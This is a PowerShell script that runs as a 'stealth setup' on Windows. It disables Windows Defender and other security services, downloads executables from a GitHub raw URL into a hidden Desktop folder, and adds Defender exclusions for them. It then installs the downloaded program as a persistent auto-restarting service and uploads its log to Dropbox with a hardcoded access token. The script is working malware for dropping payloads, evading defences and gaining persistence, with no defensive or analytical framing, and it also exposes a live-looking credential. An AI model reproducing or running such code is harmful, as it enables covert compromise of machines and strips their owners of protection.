param(
    [string]$LocalLogFile = "$(Join-Path ([Environment]::GetFolderPath('Temp')) 'stealth_log.txt')"
)

$AccessToken = "sl.u.AF6mrtdPrI-nFubRmnGEAnyqXSmVBsE0B5Xxy8fD0niE1t6OeHvy3SNkkI9tsyyVuZwj-4x2J3fOcd7ZGig7A2yQUtIQsF-NaM9nF8-DyJWPaTajOr3buIunhPgCPEpI0BLk7RD3oVJJg8poLNJCuvCh0y0s7u3WolVZ0AQdKSxm9oo4WnhOzKglrMQrCAMQ-hCfKDOu7J_XsFz22Em5Ae3GTzy_TDzVxoq08pCHtqQ5PTZcvNY-KU-wCao_fRgo3DhwzyYphpicvg6kxpEmwshAwTS6_ZBxs_f5-5I-CyGleWMWyfsaE2zwjmsYvl2RjKObeOi-MbVtqF7cRgHG-PRm7H50xnngc1PBxL6XHYPzmlCD-azwvGAgBe7HisemFaQG3YcV0XCw6mKLOtlM7KDXGeolEpiy1fcOWWEl_Tw3qscMVm07OnwCVKT3rDlcMV8WLX2rLWBaRidR0pf4H-dfGaDjjYJ0oDerVxh5k41OtwoyqBfiUOWN6PAr1E-5ZNMZahryP9P3qKtqiTt3UZcNJCoBwKrYZuAGVTxB62nd92wLd62iP_NMdSWeBeyQ3TcnH9vD2oSRjeg9guyKDXCnu_J_6Fh1PvkRhdG1FOKWUQbNn7BiiKA6EgR3I0y2efnESxyaYpgen7jnVE4P2CWwnEOmRhnMw3Q_yzspnhIR565jAdVN6DnhNbw96OioHNshrCv_xWdTYw8DIGzpXHqkp7FqgO6H_quQyWmujv7S4qnjfcI_dDCESb8JB1db2gJa1AsLu0-_vjPKvnpg_nFXsQlArIAOP22KjkVQ3z0wxi8_v_TBSj3ELkjZUh9-EBeJaa3qcJ_7V4UytRQglImUidqALixM1VwrI2iRTeKcbrbUaRcoUkAg2mxZ5Oi21MPzPKuVUwlpGOtN2u8QzJjMKMLOW9vvtPbpqnQHkIAFzgzfjqY_Fm2SUipz41cxPjN3UlRouV8j60IyMWhr8ffmpJ_vd0GY17cQJAHlfub_5uVXtHNLZXfqOIQ8qBNWh_H1kGNkMLraBwzFPQrr6QJueWi4TeYS_bZfsK7TFiLKiVsFm5Y0D173D3iJgU58Wr1O8pLsZY_G76rc9MAonRN3vK33Vn4iepD4YrkbvrWZvy_2-7FW8NtaDMg8USjHCmqWR5XTZoaeGhWr_A9RrpsbOdPj4bYTJHQBmIUlf1tWBU8pR0gHEH2g59l6y7TiD6WQdgt0S4GdMBuKnrcvtUXeGOKLiTbbtbda2-VuNmpD-4Dq5cyPcGLMhTj82MOS-MKkdVWT9SKHzRRZTDFzDl_NHEpArxx91qnze_Cqt4h0LttPYZ4C1Ho0EGGqConqXM9fIHktnrq66adh0hhKo2ByzrCns4zTIIySEmwJoSCws1eV9svWGJII9slGYrwCaN8LAZqL1JndmBElMxF9WG67"

function Write-Log {
    param ([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$timestamp][$Level] $Message"

    $logDir = Split-Path $LocalLogFile
    if (!(Test-Path $logDir)) {
        try { New-Item -Path $logDir -ItemType Directory -Force | Out-Null } catch {}
    }

    Add-Content -Path $LocalLogFile -Value $entry -ErrorAction SilentlyContinue

    $color = switch ($Level) {
        "ERROR" { "Red" }
        "WARN"  { "Yellow" }
        default { "Green" }
    }
    Write-Host $Message -ForegroundColor $color
}

function Upload-LogToDropbox {
    Log-Start "Upload-LogToDropbox"
    try {
        $FileContent = [System.IO.File]::ReadAllBytes($LocalLogFile)
        $DropboxPath = "/Stealth_Log"  

        $Headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Content-Type"  = "application/octet-stream"
            "Dropbox-API-Arg" = (@{
                "path" = $DropboxPath
                "mode" = "overwrite"
                "autorename" = $false
                "mute" = $true
                "strict_conflict" = $false
            } | ConvertTo-Json -Compress)
        }

        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers $Headers -Body $FileContent
        Write-Log "Uploaded log to Dropbox successfully."
    } catch {
        Write-Log "Failed to upload log to Dropbox: $_" "ERROR"
    }
    Log-End "Upload-LogToDropbox"
}

function Log-Start { param ([string]$FuncName) Write-Log ">>> START: $FuncName" }
function Log-End   { param ([string]$FuncName) Write-Log "<<< END: $FuncName" }

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Log "Script must be run as Administrator." "ERROR"
    exit 1
}

$desktop = [Environment]::GetFolderPath('Desktop')
$TargetFolder = Join-Path $desktop "SystemData"

function Disable-Security {
    Log-Start "Disable-Security"
    try {
        $services = @("WinDefend", "SecurityHealthService", "wscsvc", "Sense")
        foreach ($svc in $services) {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
        }
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
        Write-Log "Security disabled."
    } catch {
        Write-Log "Failed to disable security: $_" "ERROR"
    }
    Log-End "Disable-Security"
}

function Download-From-GitHub {
    param (
        [string]$FileName,
        [string]$TargetPath
    )
    $rawURL = "https://raw.githubusercontent.com/HeySinker/bsbs/main/$FileName"
    try {
        Invoke-WebRequest -Uri $rawURL -OutFile $TargetPath -UseBasicParsing -ErrorAction Stop

        cmd /c "attrib +h +s +r `"$TargetPath`"" | Out-Null
        Write-Log "Downloaded and secured: $FileName"
    } catch {
        Write-Log "Failed to download $FileName from $rawURL : $_" "ERROR"
    }
}

function Copy-Files {
    Log-Start "Copy-Files"
    try {
        if (!(Test-Path $TargetFolder)) {
            New-Item -ItemType Directory -Path $TargetFolder -Force | Out-Null

            cmd /c "attrib +h +s `"$TargetFolder`"" | Out-Null
        }

        $files = @("gSystem00.exe", "config.json", "gnssm.exe")
        foreach ($file in $files) {
            $dst = Join-Path $TargetFolder $file
            Download-From-GitHub -FileName $file -TargetPath $dst
        }

        Log-End "Copy-Files"
        return $TargetFolder
    } catch {
        Write-Log "File download failed: $_" "ERROR"
        Log-End "Copy-Files"
        return $null
    }
}

function Add-DefenderExclusions {
    param (
        [string]$FolderPath,
        [string]$ExePath
    )
    Log-Start "Add-DefenderExclusions"
    try {
        Add-MpPreference -ExclusionPath $FolderPath -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess $ExePath -ErrorAction SilentlyContinue
        Write-Log "Added Windows Defender exclusions for $FolderPath and $ExePath"
    } catch {
        Write-Log "Failed to add Windows Defender exclusions: $_" "ERROR"
    }
    Log-End "Add-DefenderExclusions"
}

function Install-GnssmService {
    param($ExecutablePath, $ServiceName, $GnssmPath)
    Log-Start "Install-GnssmService"
    try {
        & $GnssmPath remove $ServiceName confirm | Out-Null
        & $GnssmPath install $ServiceName $ExecutablePath
        & $GnssmPath set $ServiceName AppDirectory (Split-Path $ExecutablePath)
        & $GnssmPath set $ServiceName AppExit Default Restart
        & $GnssmPath set $ServiceName AppRestartDelay 30000
        & $GnssmPath set $ServiceName Start SERVICE_AUTO_START
        & $GnssmPath set $ServiceName AppStdout "NUL"
        & $GnssmPath set $ServiceName AppStderr "NUL"
        Set-Service -Name $ServiceName -StartupType Automatic
        Start-Service $ServiceName -ErrorAction SilentlyContinue
        Write-Log "Service installed and started: $ServiceName"
    } catch {
        Write-Log "Failed to install service via gnssm: $_" "ERROR"
    }
    Log-End "Install-GnssmService"
}

# -------------- MAIN ----------------
Write-Log "Starting stealth setup..."
Disable-Security

$copied = Copy-Files
if (-not $copied) {
    Write-Log "Copy-Files failed - aborting." "ERROR"
    exit 1
}

$exePath = Join-Path $copied "gSystem00.exe"
$gnssmPath = Join-Path $copied "gnssm.exe"

Add-DefenderExclusions -FolderPath $copied -ExePath $exePath

if (!(Test-Path $exePath)) {
    Write-Log "Executable missing after download. Abort." "ERROR"
    exit 1
}
if (!(Test-Path $gnssmPath)) {
    Write-Log "gnssm.exe not found at expected location: $gnssmPath" "ERROR"
    exit 1
}

Install-GnssmService -ExecutablePath $exePath -ServiceName "gSystem00" -GnssmPath $gnssmPath


Upload-LogToDropbox
Write-Log "All steps completed successfully."
